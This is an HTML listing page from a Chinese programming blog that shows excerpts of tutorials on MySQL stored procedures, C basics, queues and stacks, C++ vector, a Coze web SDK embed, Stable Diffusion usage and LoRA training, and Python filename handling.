<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc877fdcfeba1b8024112b14ddbd40f0/" rel="bookmark">
			MySQL中存储过程（详解，一篇就够了！！！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、MySQL中什么事存储过程？ 存储过程是事先经过编译并存储在数据库中的一段SOL语句的集合，调用存储过程可以简化应用开发人员的很多工作，减少数据在数据库和应用服务器之间的传输，对于提高数据处理的效率是有好处的。存储过程思想上很简单，就是数据库 SOL语言层面的代码封装与重用。
MySQL 5.0 版本开始支持存储过程。
存储过程（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。
存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数(需要时)来调用执行。
存储过程思想上很简单，就是数据库 SQL 语言层面的代码封装与重用。
优点
存储过程可封装，并隐藏复杂的商业逻辑。存储过程可以回传值，并可以接受参数。存储过程无法使用 SELECT 指令来运行，因为它是子程序，与查看表，数据表或用户定义函数不同。存储过程可以用在数据检验，强制实行商业逻辑等。 缺点
存储过程，往往定制化于特定的数据库上，因为支持的编程语言不同。当切换到其他厂商的数据库系统时，需要重写原有的存储过程。存储过程的性能调校与撰写，受限于各种数据库系统。 存储过程中的关键语法 DELIMITER // CREATE PROCEDURE CalculateSquare(IN num INT, OUT result INT) BEGIN SET result = num * num; END // DELIMITER ; DELIMITER 用于更改命令结束符，以便在存储过程中使用 BEGIN ... END 语句。通常，我们使用 // 作为新的结束符，并在存储过程定义结束后将其改回 ;。CREATE PROCEDURE 用于创建新的存储过程。CalculateSquare 是存储过程的名称。(IN num INT, OUT result INT) 定义了输入和输出参数。在这个例子中，num 是一个输入参数，result 是一个输出参数。BEGIN ... END 之间的部分是存储过程的主体，即要执行的SQL语句。 调用存储过程 要调用上述存储过程并获取结果，你需要使用 CALL 语句，并指定一个变量来接收输出参数的值：
SET @input = 5; SET @output = 0; CALL CalculateSquare(@input, @output); SELECT @output; -- 输出应该是 25 声明存储过程: CREATE PROCEDURE demo_in_parameter(IN p_in int) 变量赋值: SET @p_in=1 变量定义: DECLARE l_int int unsigned default 100000; 下面是存储过程的例子，删除给定球员参加的所有比赛： mysql&gt; delimiter $$　#将语句的结束符号从分号;临时改为两个$$(可以是自定义) mysql&gt; CREATE PROCEDURE delete_matches(IN p_playerno INTEGER) -&gt; BEGIN -&gt; DELETE FROM MATCHES -&gt; WHERE playerno = p_playerno; -&gt; END$$ Query OK, 0 rows affected (0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc877fdcfeba1b8024112b14ddbd40f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5be9412e6b56896d8c8de23564a17d36/" rel="bookmark">
			【C语言】C语言零基础纯干货教学（中）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人主页~
C语言零基础纯干货教学（上）
C语言入门 三、分支和循环1、if语句（1）if（2）else（3）分支中包含多条语句（4）嵌套if（5）else 悬空原则 2、关系操作符3、条件操作符4、逻辑操作符（1）逻辑取反运算符：！（2）逻辑与运算符：&amp;&amp;（3）逻辑或运算符：||（4）简单例题：判断闰年（5）逻辑运算符的特点：短路 5、switch语句6、while循环（1）基本概念（2）执行流程（3）例子 7、for循环（1）基本概念（2）执行流程（3）例子 8、do-while循环（1）基本概念（2）执行流程（3）例子 9、break和continue语句（1）break（2）continue 10、goto语句 三、分支和循环 1、if语句 （1）if if(a) b; 括号内表达式a如果为真，则执行b语句，如果为假，则不执行
C语言中0表示假，非0表示真
（2）else if(a) b; else c; a如果为真，则执行b语句，如果为假，则执行c语句
else是除了if以外所有情况的集合
举个简单的例子来理解
#include &lt;stdio.h&gt; int main() { int num = 0; scanf("%d", &amp;num); if (num % 2 == 1) printf("%d 是奇数\n", num); else printf("%d 是偶数\n", num); return 0; } （3）分支中包含多条语句 多条语句可以用花括号括起来
if(a） { b; c; d; } （4）嵌套if else 与 if 可以嵌套使用构成else if
if(a) b; else if(c) d; else e; 如果满足a的话执行b，满足c的话执行d，都不满足执行e
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5be9412e6b56896d8c8de23564a17d36/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/623735739ca20d3ca93427621b7c8d8c/" rel="bookmark">
			数据结构之循环队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人主页：星纭-CSDN博客
系列文章专栏：数据结构
踏上取经路，比抵达灵山更重要！一起努力一起进步！
目录
一.循环队列
1.循环队列的介绍 2.循环队列的实现
这个循环队列的结构体怎么完成？
rear指针的实际意义
那么如何解决判满判空呢?
如何让队列循环起来？
3.代码
1.myCircularQueueCreate()函数
2.判满判空函数
3.插入删除函数
4.查看队首队尾元素
5.释放函数
一.循环队列 1.循环队列的介绍 循环队列是一种特殊的队列数据结构，它可以在固定大小的数组中实现队列的功能。
如果使用数组完成队列的话，是会存在空间浪费的问题的。比如：
在完成插入数据之后，我们在出数据的时候，为了效率，是不会将后面的数据往前移动一个位置的，而是直接让front指针+1.那么数组下标为0的位置的数据就不在队列中了，可是这样是有个问题的，这个空间浪费了，不属于这个队列了。如果我们继续插入数据。
当在存储3个数据之后，此时的数组就用完了。而且随着数据不断删除，这个队列能存储的数据将会越来越少。那么应该怎么解决这个问题呢？
前面浪费的空间也可以利用起来，如果要再插入数据就将这个数据放入下标为0的位置上去，此时的队列才是真正的满了。
如果这样实现队列，就解决了数组实现队列空间浪费的问题。
2.循环队列的实现 typedef struct { } MyCircularQueue; //设置队列，队列长度为k MyCircularQueue* myCircularQueueCreate(int k); bool myCircularQueueEnQueue(MyCircularQueue* obj, int value); bool myCircularQueueDeQueue(MyCircularQueue* obj); //获取队首，队尾元素 int myCircularQueueFront(MyCircularQueue* obj); int myCircularQueueRear(MyCircularQueue* obj); //判空判满 bool myCircularQueueIsEmpty(MyCircularQueue* obj); bool myCircularQueueIsFull(MyCircularQueue* obj); //释放 void myCircularQueueFree(MyCircularQueue* obj); 这个循环队列的结构体怎么完成？ 首先一个指向数组的指针肯定需要有，然后就是两个指针front，rear分别代表头指针与尾指针。
其实还需要一个k来表示这个数组的大小。（原因文章后面解释）
rear指针的实际意义 假设此时循环队列为空，将front和rear都指向0这个下标。
此时因为循环队列没有数据，rear 指向的就是队尾元素的下一个位置。
如果要使rear指针指向队尾元素，那么rear起始就应该指向-1如果插入一个元素后加1，rear就是0，指向队尾元素。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/623735739ca20d3ca93427621b7c8d8c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71cc79c82d901e862087d9b04557e48a/" rel="bookmark">
			【Coze】把 AI 嵌入到自己网站的网页中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【Coze】把 AI 嵌入到自己网站的网页中 最近coze国际版升级了，支持通过类似chatgpt的api来调用你创建的bot机器人了，而且还支持将你创建的机器人嵌入到你自己网站的网页中，非常强大，每个用户都有免费的额度。
我们今天主要介绍通过coze web sdk快速地把ai集成到网页中：https://www.coze.com/open
安装SDK 按照以下步骤通过将JavaScript库添加到您的Web应用程序来安装SDK。
登录 Coze 平台。查找要部署为Web服务的目标 Bot。在 Develop 页面，复制并保存当前页面 URL 的最后一个字符串。这个是 bot id，将在以后的配置中使用。 点击 Publish。在 Publish 页面，选择 Web SDK 选择并单击 Publish。
点击 Installation 复制安装代码并将 JavaScript 库添加到您的 Web 应用程序中。
&lt;script src="https://sf-cdn.coze.com/obj/unpkg-va/flow-platform/chat-app-sdk/{{version}}/libs/oversea/index.js"&gt;&lt;/script&gt; 代码示例:
&lt;script src="https://sf-cdn.coze.com/obj/unpkg-va/flow-platform/chat-app-sdk/0.1.0-beta.1/libs/oversea/index.js"&gt;&lt;/script&gt; &lt;script&gt; new CozeWebSDK.WebChatClient({ config: { bot_id: '7330255745843249xxxx', }, componentProps: { title: 'Assistant', }, }); &lt;/script&gt; 具体参数配置如下：
销毁SDK客户端 可以添加一个 destroy 方法销毁 bot 客户端。
&lt;script&gt; const client = new CozeWebSDK.WebChatClient(options); client.destroy(); &lt;/script&gt; 断开连接 如果你不再想让 Bot 以 web 服务方式使用，在 Publish 页面，点击 Disconnect 按钮。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/806ba3a4906d6023a8193c370744b9dc/" rel="bookmark">
			C/C&#43;&#43; vector详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要想了解STL，就必须会看：
cplusplus.comhttps://legacy.cplusplus.com/
官方内容全都是英文的，可以参考：
C/C++初始识https://blog.csdn.net/2301_77087344/article/details/138596294?spm=1001.2014.3001.5501
vector：向量，顺序表，是一个类模板，顺序容器
vector类常用的函数如下：
1.构造函数 vector()://创建一个空vectorvector(int nSize)://创建一个vector,元素个数为nSizevector(int nSize,const t&amp; t)://创建一个vector ,元素个数为nSize，且值均为tvector(const vector&amp;)://赋值构造函数vector(begin,end)://赋值[begin,end)区间内另一个数组的元素到vector中 2.增加函数 void push_back(const T&amp; x)://向尾部增加一个元素xiterator insert(iterator it,const T&amp; x)://向量中迭代器指向元素前增加一个元素xiterator insert(iterator it,int n,const T&amp; x)://向量中迭代器指向元素前增加n个相同元素xiterator insert(iterator it,const_iterator first,const_iterator last)://向量中迭代器指向元素前插入另一个相同类型向量的[firs.last)间的数据 3.删除函数 iterator erase(iterator it):删除向量中迭代器指向元素iterator erase(iterator first,iterator last):删除向量中[first,last)中元素void pop_back():删除向量中最后一个元素void clear():情况向量中所有元素 4.遍历函数 reference at(int pos)://返回pos位置元素的引用reference front()://返回首元素的引用reference back()://返回尾元素的引用iterator begin()://返回向量头指针，指向第一个元素iterator end()://返回为指针，指向向量最后一个元素的下一个位置reverse_iterator rbein()://反向迭代器，指向最后一个元素reverse_iterator rend()://指向第一个元素之前的位置 5.判断函数 bool empty() const://判断向量是否为空，为空，则向量中无元素 6.大小函数 int size() const://返回向量中元素的个数int capacity() const: //返回当前向量中宏能容纳的最大元素值int max_size() const://返回最大可允许的vector元素数量值 7.其他函数 void swap(vector&amp;);//交换连个同类型的数据void assign(int n,const T&amp; x);//设置向量中第n个元素为xvoid assign(const_iterator first,const_iterator last)://向量中[first,last)中元素设置成当前向量元素 示例： 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/806ba3a4906d6023a8193c370744b9dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37297f97c9fe918b4dca0f40014683d5/" rel="bookmark">
			fiddler everywhere免费版 mac的m芯片(附:下载地址)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着网络应用的不断发展，Web 开发人员需要强大的工具来调试和分析其应用程序的网络流量。Fiddler Everywhere 是一个备受推崇的工具，它提供了强大的功能，帮助开发人员深入了解他们的应用程序与网络之间的交互。而现在，Fiddler Everywhere 推出了免费版，让更多的开发人员能够享受到其强大的功能。在本文中，我们将深入探讨 Fiddler Everywhere 免费版在 macOS 上的应用。
Fiddler Everywhere 简介 Fiddler Everywhere 是一款跨平台的网络调试工具，它允许开发人员监视、调试和分析其应用程序的网络流量。无论是 Web、移动应用还是桌面应用，Fiddler Everywhere 都能够帮助开发人员捕获和分析请求和响应，从而加速问题的诊断和解决过程。
Fiddler Everywhere 免费版功能概览 Fiddler Everywhere 免费版提供了一系列强大的功能，使开发人员能够更轻松地进行网络调试和分析。以下是一些主要功能：
网络流量捕获与分析：Fiddler Everywhere 允许开发人员捕获来自应用程序的 HTTP 和 HTTPS 流量，并提供可视化的界面来分析这些流量。这对于调试应用程序中的网络问题至关重要。
HTTP/HTTPS 改写：开发人员可以使用 Fiddler Everywhere 修改请求和响应，以模拟不同的场景和条件。这对于测试应用程序在不同网络环境下的表现非常有用。
性能分析：Fiddler Everywhere 提供了强大的性能分析工具，帮助开发人员识别应用程序中的性能瓶颈并优化网络请求。
WebSocket 调试：WebSocket 是现代 Web 应用中常用的通信协议之一，Fiddler Everywhere 允许开发人员捕获和分析 WebSocket 的通信流量，帮助他们诊断与调试 WebSocket 相关的问题。
脚本支持：Fiddler Everywhere 允许开发人员编写脚本来自动化某些任务，例如自定义请求/响应处理、自动化测试等。
在 macOS 上安装与配置 Fiddler Everywhere 免费版 安装 Fiddler Everywhere 免费版在 macOS 上非常简单。只需按照以下步骤操作：
下载安装：从 Fiddler Everywhere 官方网站下载 macOS 版本的安装包，并按照安装向导进行安装。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37297f97c9fe918b4dca0f40014683d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0125519803b7adbbde940323c420982f/" rel="bookmark">
			AI绘画，用stable diffusion将图片转成线稿，手绘稿快速生成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 前几天我们讲了如何利用 stable diffusion 为线稿上色，操作方法非常简单，上色的效果却惊艳了众人，让很多美术生直呼没活路了（具体文章到我的主页里找）。
文章使用的AI绘画SD整合包、各种模型插件、提示词、AI人工智能学习资料都已经打包好放在网盘中了，无需自行查找，。有需要的小伙伴文末扫码自行获取。
今天我们要反其道而行之，来试试如何用 stable diffusion 将图片变成线稿。
下图为实现的效果（这是照片转线稿，图片放反了，线稿应该在右）。
首先，我们要准备一张白底的图片， 做白底图片的方法很多，可以用 photoshop ，也可以用截图也行。图片尺寸尽量用4的倍数，因为这次做的是竖图，所以尺寸我们设成512*768。下图为用 photoshop 设置白底图片的方法。
打开 stable diffusion 的工作台，进入图生图界面，把做好的白底图片拖进来，用它做了白底参考图片。
注意尺寸，设置为刚刚调整好的512*768，重绘幅度一定要调大一些，大概在0.95左右，这张白底只是做为参考，我们要让提示词在新生成的画面中起到更高的作用程度。
ControlNet设置，接着打开下方的 ControlNet 界面，将要变线稿的图片拖进来，预处理器和模型都用 Canny算法，你也可以用其他算法尝试一下，会有不同的结果。
重要的事情说三遍，一定要勾选启用，一定要勾选启用，一定要勾选启用，老是有人忘记了勾选，结果就是不起任何作用。尺寸也要设为512*768，要和上方的一致。其他参数默认即可。
下面这张是我们要转成线稿的图片。
点击下方的预览处理结果，可以看到 Canny 对图片进行的轮廓描绘情况。
我们要用Canny算法生成的轮廓图，通过图生图功能，叠加上方的白底图片，最终生成我们想要的线稿图片。
接下来在正面提示词中输入线稿图的提示词：tag: a line drawing, line art, line work。
点击生成按钮，得到线稿图案：
如果你想对线稿的粗细进行调节的话，可以调节“引导介入时机”，自己多尝试不同的数值，会有不同的效果。
文章使用的AI绘画SD整合包、各种模型插件、提示词、AI人工智能学习资料都已经打包好放在网盘中了，无需自行查找，。有需要的小伙伴文末扫码自行获取。
写在最后 AIGC技术的未来发展前景广阔，随着人工智能技术的不断发展，AIGC技术也将不断提高。未来，AIGC技术将在游戏和计算领域得到更广泛的应用，使游戏和计算系统具有更高效、更智能、更灵活的特性。同时，AIGC技术也将与人工智能技术紧密结合，在更多的领域得到广泛应用，对程序员来说影响至关重要。未来，AIGC技术将继续得到提高，同时也将与人工智能技术紧密结合，在更多的领域得到广泛应用。
感兴趣的小伙伴，赠送全套AIGC学习资料和安装工具，包含AI绘画、AI人工智能等前沿科技教程，模型插件，具体看下方。
一、AIGC所有方向的学习路线
AIGC所有方向的技术点做的整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照下面的知识点去找对应的学习资源，保证自己学得较为全面。
二、AIGC必备工具
工具都帮大家整理好了，安装就可直接上手！
三、最新AIGC学习笔记
当我学到一定基础，有自己的理解能力的时候，会去阅读一些前辈整理的书籍或者手写的笔记资料，这些笔记详细记载了他们对一些技术点的理解，这些理解是比较独到，可以学到不一样的思路。
四、AIGC视频教程合集
观看全面零基础学习视频，看视频学习是最快捷也是最有效果的方式，跟着视频中老师的思路，从基础到深入，还是很容易入门的。
五、实战案例
纸上得来终觉浅，要学会跟着视频一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
若有侵权，请联系删除 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf2485ccaea6d2c79bb1cc8c0accc6f1/" rel="bookmark">
			数据结构栈和队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人主页：星纭-CSDN博客
系列文章专栏：数据结构
踏上取经路，比抵达灵山更重要！一起努力一起进步！
目录
一.栈 1.栈的介绍
2.初始化与销毁
3.入栈和出栈
4.栈顶元素，判空，求栈的元素个数
代码：
test.c
stack.h:
stack.c:
二.队列 1.队列的介绍
2.初始化与销毁
3.插入与删除 4.查看队头队尾元素
5.判空与队列大小
代码：
一.栈 1.栈的介绍 栈是一种线性数据结构，它只能在固定的一端进行插入和删除操作，这一端被称为栈顶，另一端则称为栈底。栈的特点是后进先出（Last In First Out，LIFO），即最后插入的元素最先被删除，而最先插入的元素最后被删除。
栈的基本操作有两个：入栈（push）和出栈（pop）。入栈操作将元素插入到栈顶，出栈操作将栈顶元素删除并返回。 入栈：栈插入数据的操作也叫入栈/压栈/进栈，入数据在栈顶。出栈：栈的删除操作也叫做出栈。出数据也在栈顶。 栈可以用来解决一些具有后效性的问题，例如表达式求值、括号匹配、函数调用等。它也可以用于实现一些常见的数据结构，例如递归函数、深度优先搜索等。 栈可以使用数组或链表来实现。使用数组实现的栈称为顺序栈，使用链表实现的栈称为链式栈。无论使用哪种实现方式，栈的空间复杂度都为O(n)，其中n为栈中元素的个数。 栈还有一些常见的扩展操作，例如获取栈顶元素（top）、判断栈是否为空（isEmpty）、获取栈中元素个数（size）等。这些操作的时间复杂度都为O(1)。
对于顺序栈来说，又分两种情况：一种是定长的静态栈结构，一般情况下，实际中用的比较少，另一种是支持动态增长的栈。
以下的栈的实现，作者基于支持动态增长的顺序栈完成。
typedef int STDatatype; typedef struct{ STDatatype* a; int top;//栈顶 int capacity;//栈的容量 }Stack; 为了方便对存储的数据类型进行更改，我们对int重命名一下，如果以后要存储char类型的数据，只需要更改一下int为char就可以轻松完成。 2.初始化与销毁 //初始化 void STInit(Stack* pst); //销毁 void STDestory(Stack* pst); 1.初始化
void STInit(Stack* pst) { pst-&gt;a = NULL; pst-&gt;capacity = pst-&gt;top = 0; }; 因为开始的时候，这个栈中并没有任何的元素，所以我们将其的a初始化为NULL,top和capacity为0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf2485ccaea6d2c79bb1cc8c0accc6f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7fb1c3a5fc4171e2be9814c80bf614ba/" rel="bookmark">
			AI绘图开源工具Stable Diffusion WebUI前端API调用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 本文主要介绍 AI 绘图开源工具 Stable Diffusion WebUI 的 API 开启和基本调用方法，通过本文的阅读，你将了解到 stable-diffusion-webui 的基本介绍、安装及 API 环境配置；文生图、图生图、局部重绘、后期处理等 API 接口调用；图像处理开发中常用到一些方法如 Base64、PNG、Canvas及 URL 相互转换、Canvas 颜色转换等。
AI 绘图工具目前市面上比较广泛使用的主要有两款，一个是 Midjourney，它提供面向用户有好的操作界面，文生图、图生图等功能非常强大，但是它是一款收费软件；另一个就是开源工具 Stable Diffusion, 同样具有强大的AI绘图和图片再创造能力，但是学习成本和上手难度相对较大，不过由于它是开源的，现在有非常多的用户和开发者，我们可以找到丰富的训练模型和学习资源。本文介绍的 Stable Diffusion WebUI 就是基于 Stable Diffusion 的具有比较完善的可视化操作界面的 AI 绘图开源工具，它的 github 访问地址是 github.com/AUTOMATIC11…。
顺便一提，本文上方的 Banner 图就是使用 Stable Diffusion 生成的 😎
使用体验 在正式开发之前，我们可以先体验一下 Stable Diffusion WebUI 以及两个接口封装和操作界面比较优秀的 AI 绘图网站，了解文生图、图生图、后期处理等基本操作步骤。
🔗 stablediffusionweb.com/WebUI🔗 d.design🔗 www.liblibai.com 环境配置 安装 Stable Diffusion WebUI 我们首先需要先在本地或者服务器安装部署 Stable Diffusion WebUI，可以从Github克隆仓库，然后按说明文档进行安装，对前端开发来说安装流程非常简单，详细安装流程大家可以自行搜索，现在网上已经有很多保姆级的教程，本文不再赘述。
安装完成后，在 Windows操作系统中进入 stable-diffusion-webui 根目录，然后双击 webui-user.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7fb1c3a5fc4171e2be9814c80bf614ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/973b9a1503adc6ba3f0bbeacac5bacc0/" rel="bookmark">
			【2024最新】史上最强AI-GPT4o国内保姆级使用教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 GPT-4o搭建教程准备1.云服务器2.支持GPT+Midjourney的服务的秘钥3.准备的资料 补充：绑定域名 GPT-4o搭建教程 本期教程搭建的程序集齐了市场上超火的AI功能
1.GPT-3.5
2.GPT-4o ( 最新版 )
3.GPTs ( 联网、数据分析、文生图等超多插件功能)
4.Claude-3 ( sonnet、opus 2个版本都有 )
5.Midjourney 超强Ai绘图
6.DALL-E 绘图
6.suno 音乐模型（创作歌曲）
准备 1.云服务器
2.支持GPT+GPTs+MJ+Claude3的key密钥
3.资料包
1.云服务器 因内地服务器备案流程复杂，这里选择无需备案的香港服务器
6推荐：香草云，性价比高，安全稳定，本人常用
网址：https://www.xiangcaoyun.com/
香港1核2g即可
注意：购买云服务器，一定要选择CentOS系统，版本选择默认的就行
2.支持GPT+Midjourney的服务的秘钥 中转key获取网站： https://api.maynor1024.live/
然后复制我们的key sk-xxxxx
待会会用到~
3.准备的资料 6安装FinalShell软件
下载链接：https://www.hostbuf.com/t/988.html
6资料包
下载链接：https://share.weiyun.com/rZy0yeND
备用下载链接：https://pan.baidu.com/s/1J1SWNtCR2ixFo5bMe2bq7w?pwd=zreq 【提取码：zreq 】
修改好后，ctrl+s保存即可
开始搭建
打开软件，点击箭头所示按钮 会跳出个窗口，接着点击箭头所示按钮，点击SSH链接 把红框里的内容填进去 填完后，这里会记录，双击打开它 即可链接成功 6.安装Ai程序
出现下图所示，说明在自动安装程序
出现这个，说明程序已经安装完成
补充： 绑定域名 域名购买网站：
西部数码：https://www.west.cn/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/490dec8b5497e2b591719de67bf8238b/" rel="bookmark">
			如何在Python中从路径中获取不带扩展名的文件名？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在处理文件时，我们经常需要从文件路径中提取文件名，而文件名通常包含扩展名。在Python中，有几种方法可以获取不带扩展名的文件名。本文将详细介绍这些方法，并提供示例代码，帮助初学者理解其工作原理。
基本原理 在Python中，os.path模块提供了很多用于文件路径操作的函数，其中os.path.splitext()可以用来分割文件名和扩展名。另外，os.path.basename()可以用来获取路径中的文件名部分。结合这两个函数，我们可以轻松地获取不带扩展名的文件名。
示例代码 示例1：使用os.path模块 import os # 定义一个文件路径 file_path = '/path/to/your/file.txt' # 获取文件名（包含扩展名） file_name_with_extension = os.path.basename(file_path) # 分割文件名和扩展名 file_name, extension = os.path.splitext(file_name_with_extension) print(f'文件名（不含扩展名）: {file_name}') print(f'扩展名: {extension}') 运行结果：
文件名（不含扩展名）: file 扩展名: .txt 示例2：使用pathlib模块（Python 3.4+） Python 3.4及以上版本引入了pathlib模块，它提供了面向对象的文件系统路径操作。
from pathlib import Path # 定义一个文件路径 file_path = Path('/path/to/your/file.txt') # 获取文件名（包含扩展名） file_name_with_extension = file_path.name # 获取不带扩展名的文件名 file_name = file_path.stem print(f'文件名（不含扩展名）: {file_name}') print(f'扩展名: {file_path.suffix}') 运行结果：
文件名（不含扩展名）: file 扩展名: .txt 示例3：处理多个文件 假设我们需要处理一个包含多个文件的目录，我们可以遍历目录中的所有文件，并打印出每个文件的不带扩展名的文件名。
import os # 定义目录路径 directory_path = '/path/to/directory' # 遍历目录中的所有文件 for filename in os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/490dec8b5497e2b591719de67bf8238b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b315e8317c4264316beb9fec74138395/" rel="bookmark">
			手把手教你用LoRA训练自己的Stable Diffusion模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
写在前面
一、准备数据
二、数据打标签
三、执行训练
四、执行推理
1.LoRA推理
2.全参数推理
写在前面 Stable Diffusion大家已经很熟悉了，那么如何训练自己的sd模型呢，今天我就介绍一下用LoRA训练sd的方法。
建议先看一下这两篇文章，了解一些前置知识：
手把手教你在linux中部署stable-diffusion-webui
如何训练一个大模型：LoRA篇
我们以Chilloutmix为例，Chilloutmix可以生成好看的小姐姐。为了实验LoRA的能力，我们用小哥哥的图片对它进行微调，看效果如何。
一、准备数据 从网上找一些小帅的图片，需要脸部清晰的、多角度的、正脸的、侧脸的、最好是背景干净的、各种表情的，这样增加训练集的多样性，提高模型的泛化能力。
素材可以少（一般几十张就不少了，太多了也会过拟合），但是质量一定要高。 背景最好是纯色，想训练什么就突出什么，对于我们的任务，需要选取人脸为重点的图片。
搜集好训练用的图像后，需要进行大小的规范处理，需要是64的倍数。一般都处理为512*512，也可以是768*768，不建议超过1024，尺寸越大则越吃显存。
推荐一个批量处理图像尺寸的网站挺好用的：https://www.birme.net/ 处理后的图片长这样：
二、数据打标签 其实我们要训练的是ControlNet，现在图片有了，还差图片的描述或者叫标签。我们不需要自己手动给每张图片打标签，sd-webui有现成的工具（DeepBooru）生成图片的标签。
在sd-webui中进行如上操作，在3填写输入图片的目录，4填写输出目录，处理之后原图片和标签文件txt都会放在输出目录
txt中的内容长这样，都是一个一个的标签：
接下来我们要检查每张图片的标签，这里有两个简单的原则：
1.通用的特征标签需要去掉，比如人物的眼睛、眉毛、鼻子、头发长度等代表人物本身的属性。凡是绑定在人物身上的，就要把它们删除。再比如出图只要黑色头发，那训练数据都喂黑色头发，并且删掉类似“black_hair”的标签。
2.留下非通用的标签，比如不是每张训练数据都是微笑的，所以对于微笑的数据应该有“smile”标签；不是所有的数据背景都是白色，就要保留“white backgroud”。
具体保留或者增加什么标签其实没有硬性的规定，还是要根据具体情况反复尝试。
sd-webui是有打标签的插件的，但是我更喜欢一款小工具，方便多人使用，BooruDatasetTagManager，地址：https://pan.baidu.com/s/1Ff7nkwf95AziCcZWTofIzg?pwd=jfoe 数据和标签准备好后放在一个自定义的目录中待用，有一点需要注意，文件名的格式是数字_字母，前面的数字是每次训练过程中网络训练单张图片的次数，比如10_asianman。这个目录命名很重要，一定不要写错！！！
三、执行训练 LoRA训练我们使用kohya，kohya是日本人开发的，所以会经常出现日文，凑活这看吧。
1.下载kohya，别忘了下载sd-scripts目录中的项目：kohya-ss (Kohya S.) · GitHub，下载后执行:
pip install -r requirements.txt 2.因为我们是对Chilloutmix进行微调，所以先在这里下载Chilloutmix，并放在model目录下。
3.启动kohya:
python kohya_gui.py --listen 0.0.0.0 --server_port 12348 --inbrowser 4.打开地址http://[ip]:12348/ ，并填写配置信息：
同时Parameters菜单中还有一些高级设置，比如batch size、train steps、LoRA的秩、Alpha等：
一些注意： 1.训练时的总epoch数是算出来的，上面的Epoch好像没有用，计算公式是：
Max train steps * Train batch size / (数据总数 * 训练单张图片的次数)，这算法很奇怪，他把Train batch size当做了batch size per device
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b315e8317c4264316beb9fec74138395/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
